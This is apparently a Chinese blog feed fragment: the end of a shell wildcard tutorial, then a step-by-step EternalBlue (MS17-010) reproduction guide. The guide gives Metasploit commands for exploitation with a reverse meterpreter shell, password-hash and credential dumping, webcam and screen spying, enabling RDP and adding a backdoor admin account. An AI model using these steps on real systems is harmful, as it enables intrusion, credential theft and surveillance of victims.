+&lt;p>&lt;strong>用途&lt;/strong>：快速切换到父目录。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="九单字符通配符">（九）&lt;code>?&lt;/code>：单字符通配符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：匹配文件名中的任意单个字符。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f?.txt &lt;span class="c1"># 匹配 f0.txt、f1.txt 等&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：用于文件名匹配。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十多字符通配符">（十）&lt;code>*&lt;/code>：多字符通配符
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：匹配任意长度的字符序列。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f*.txt &lt;span class="c1"># 匹配以 f 开头的所有 .txt 文件&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：用于文件名匹配。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十一逻辑非">（十一）&lt;code>!&lt;/code>：逻辑非
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>功能&lt;/strong>：表示逻辑非，用于条件表达式中。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>示例&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls f&lt;span class="o">[&lt;/span>!1-9&lt;span class="o">]&lt;/span>.txt &lt;span class="c1"># 匹配除了 f1.txt 到 f9.txt 之外的文件&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>用途&lt;/strong>：用于条件判断或文件名匹配。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="二补充特殊字符">二、补充特殊字符
+&lt;/h2>&lt;h3 id="十二">（十二）`
+&lt;/h3></description></item><item><title>永恒之蓝漏洞复现</title><link>https://souljian.cn/p/745241647/</link><pubDate>Mon, 21 Apr 2025 21:20:47 +0800</pubDate><guid>https://souljian.cn/p/745241647/</guid><description>&lt;p>很抱歉，我无法直接生成图片，但我可以为你提供一份详细的笔记，包括命令解释和说明。你可以根据这些内容自行绘制相关流程图或示意图。&lt;/p>
+&lt;hr>
+&lt;h3 id="一什么是永恒之蓝">（一）什么是永恒之蓝？
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>定义&lt;/strong>：永恒之蓝（Eternal Blue）是一种利用 Windows 系统 SMB 协议漏洞（通常使用 139、445 端口）的攻击方式，攻击者通过该漏洞可获取系统最高权限，进而控制被入侵计算机。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>影响范围&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>2017 年 5 月 12 日，不法分子改造&amp;quot;永恒之蓝&amp;quot;制作了 WannaCry 勒索病毒，导致全球范围内大量机构（包括学校、大型企业和政府机构）遭受攻击。&lt;/li>
+&lt;li>被攻击设备被锁定，要求支付 300 美元比特币赎金，否则删除文件。&lt;/li>
+&lt;li>攻击通过扫描开放 445 端口的 Windows 机器，无需用户操作，开机上网即可被植入勒索软件、远程控制木马等恶意程序。&lt;/li>
+&lt;li>受影响国家包括乌克兰、俄罗斯、西班牙、法国、英国等，重要基础设施（政府、银行、电力系统等）均被波及。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二受影响的系统版本">（二）受影响的系统版本
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>桌面操作系统&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Windows XP&lt;/li>
+&lt;li>Windows Vista&lt;/li>
+&lt;li>Windows 7&lt;/li>
+&lt;li>Windows 8&lt;/li>
+&lt;li>Windows 8.1&lt;/li>
+&lt;li>Windows 10&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>服务器操作系统&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>Windows Server 2000&lt;/li>
+&lt;li>Windows Server 2003&lt;/li>
+&lt;li>Windows Server 2008&lt;/li>
+&lt;li>Windows Server 2012&lt;/li>
+&lt;li>Windows Server 2016&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>备注&lt;/strong>：是否受影响取决于是否安装了对应的补丁。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="二永恒之蓝攻击步骤">二、永恒之蓝攻击步骤
+&lt;/h2>&lt;h3 id="一内网扫描存活机器">（一）内网扫描存活机器
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nmap -sS -p &lt;span class="m">445&lt;/span> 192.168.110.0/24 &amp;gt; p_445
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>使用 &lt;code>nmap&lt;/code> 工具进行半开放扫描（&lt;code>-sS&lt;/code>），扫描指定网段（&lt;code>192.168.110.0/24&lt;/code>）内开放 445 端口的主机。&lt;/li>
+&lt;li>扫描结果保存到文件 &lt;code>p_445&lt;/code> 中。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>目的&lt;/strong>：找出内网中可能存在的目标主机。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二确定攻击目标">（二）确定攻击目标
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>操作&lt;/strong>：筛选出开放 445 端口的存活机器，确定攻击目标。&lt;/li>
+&lt;/ul>
+&lt;h3 id="三测试目标连通性">（三）测试目标连通性
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ping &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 &lt;code>ping&lt;/code> 命令测试目标主机的网络连通性，确保目标主机可达。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四打开-kali-数据库">（四）打开 Kali 数据库
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">service postgresql status
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql start
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">service postgresql status
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>查看 PostgreSQL 数据库服务的状态。&lt;/li>
+&lt;li>如果未开启，则启动数据库服务。&lt;/li>
+&lt;li>再次确认数据库服务已成功启动。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="五数据库初始化">（五）数据库初始化
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfdb init
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：初始化 Metasploit 框架的数据库，为后续攻击做准备。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="六启动-msf-工具">（六）启动 msf 工具
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfconsole
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：启动 Metasploit 框架的控制台。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="七搜索永恒之蓝漏洞">（七）搜索永恒之蓝漏洞
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">search ms17_010
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：在 Metasploit 框架中搜索与 MS17-010 漏洞相关的模块。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="八选择扫描模块">（八）选择扫描模块
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/scanner/smb/smb_ms17_010
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/windows/smb/ms17_010_eternalblue
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>auxiliary/scanner/smb/smb_ms17_010&lt;/code>：用于扫描目标主机是否存在 MS17-010 漏洞（Proof of Concept，PoC 扫描）。&lt;/li>
+&lt;li>&lt;code>exploit/windows/smb/ms17_010_eternalblue&lt;/code>：用于实际利用 MS17-010 漏洞的攻击模块。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="九设置扫描基本配置">（九）设置扫描基本配置
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> rhost &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> lhost &lt;span class="o">[&lt;/span>攻击机IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>rhost&lt;/code>：设置目标主机的 IP 地址。&lt;/li>
+&lt;li>&lt;code>payload&lt;/code>：设置攻击载荷，这里使用的是 &lt;code>windows/x64/meterpreter/reverse_tcp&lt;/code>，即 64 位 Windows 系统的 Meterpreter 反向 TCP 连接。&lt;/li>
+&lt;li>&lt;code>lhost&lt;/code>：设置攻击机的 IP 地址，用于接收目标主机的 Meterpreter 连接。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十开始攻击">（十）开始攻击
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exploit
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：执行攻击，利用 MS17-010 漏洞入侵目标主机。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="十一攻击生效">（十一）攻击生效
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>操作&lt;/strong>：攻击成功后，可进行以下操作：&lt;/p>
+&lt;ul>
+&lt;li>文件上传下载&lt;/li>
+&lt;li>获取截屏&lt;/li>
+&lt;li>获取密码&lt;/li>
+&lt;li>开启摄像头&lt;/li>
+&lt;li>后门持久化等&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="三漏洞利用">三、漏洞利用
+&lt;/h2>&lt;h3 id="一截屏">（一）截屏
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">screenshot
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>screenshot&lt;/code> 命令获取目标主机的屏幕截图，截图保存在攻击机的 &lt;code>/home/mz/&lt;/code> 目录下。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二获取账号密码">（二）获取账号密码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashdump
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">load kiwi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ps -S &lt;span class="s2">&amp;#34;csrss&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">migrate &lt;span class="o">[&lt;/span>进程号&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">creds_all
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>hashdump&lt;/code>：获取目标主机的用户名及加密密码。&lt;/li>
+&lt;li>&lt;code>load kiwi&lt;/code>：加载 Kiwi 模块，用于获取更详细的凭证信息。&lt;/li>
+&lt;li>&lt;code>ps -S &amp;quot;csrss&amp;quot;&lt;/code>：搜索 &lt;code>csrss.exe&lt;/code> 进程，获取其进程号。&lt;/li>
+&lt;li>&lt;code>migrate [进程号]&lt;/code>：将 Meterpreter 迁移到指定进程，获取更高的权限（如 SYSTEM 权限）。&lt;/li>
+&lt;li>&lt;code>creds_all&lt;/code>：获取目标主机的所有凭证信息，包括解析加密密码。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="三实时监控">（三）实时监控
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">run vnc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">screenshare
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>run vnc&lt;/code>：启动 VNC 服务，用于远程桌面监控。&lt;/li>
+&lt;li>&lt;code>screenshare&lt;/code>：共享屏幕，实时查看目标主机的屏幕操作。&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四开启摄像头">（四）开启摄像头
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">webcam_stream
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>webcam_stream&lt;/code> 命令开启目标主机的摄像头，实时监控。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="四后渗透阶段">四、后渗透阶段
+&lt;/h2>&lt;h3 id="一shell-连接目标机器">（一）Shell 连接目标机器
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">shell
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Meterpreter 的 &lt;code>shell&lt;/code> 命令获取目标主机的命令行交互界面。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="二消除乱码">（二）消除乱码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chcp &lt;span class="m">65001&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：在目标主机上设置字符编码为 UTF-8，避免乱码问题。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="三开启目标远程桌面服务">（三）开启目标远程桌面服务
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wmic RDTOGGLE WHERE &lt;span class="nv">ServerName&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;%COMPUTERNAME%&amp;#39;&lt;/span> call SetAllowTSConnections &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：通过 Windows Management Instrumentation Command-line（WMIC）工具开启目标主机的远程桌面服务（默认端口 3389）。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="四查看端口开启状态">（四）查看端口开启状态
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">netstat -an
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：查看目标主机的网络连接状态，确认远程桌面服务端口（3389）是否已开启。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="五远程桌面连接">（五）远程桌面连接
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>命令&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rdesktop &lt;span class="o">[&lt;/span>目标IP&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>解释&lt;/strong>：使用 &lt;code>rdesktop&lt;/code> 工具连接目标主机的远程桌面服务。&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="六登录账号密码">（六）登录账号密码
+&lt;/h3>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>操作&lt;/strong>：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>如果目标主机已有账号密码，直接使用。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>如果没有，可通过以下命令新建用户并提升为管理员：&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>创建用户&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net user hack &lt;span class="m">123456&lt;/span> /add
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>提升为管理员&lt;/strong>：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
